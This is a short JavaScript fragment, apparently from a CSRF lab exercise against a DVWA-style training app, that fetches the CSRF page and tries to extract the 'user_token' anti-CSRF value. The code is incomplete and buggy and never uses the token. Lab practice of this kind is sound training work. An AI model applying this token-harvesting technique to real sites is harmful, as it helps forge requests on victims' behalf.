fetch("http://servertcm:8001/vulnerabilities/csrf/").then(d => d.text()).then(t=>{
    let parser = new DOMParser();
    let doc = parser.parseFromString(t,"text/html")

    let userToken = doc.querySelectorAll("input").filter(i => {
        i.name == "user_token";
    })[0];
    
});